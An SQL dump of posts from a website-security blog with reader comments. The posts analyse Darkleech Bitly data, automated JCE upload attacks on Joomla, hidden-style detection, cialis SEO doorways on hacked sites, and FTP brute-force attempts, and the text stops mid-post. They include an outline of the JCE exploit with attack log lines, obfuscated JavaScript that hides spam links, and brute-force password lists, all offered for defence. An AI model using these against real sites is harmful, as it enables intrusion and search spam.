INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (165, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (166, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (167, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (168, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (169, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (170, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting 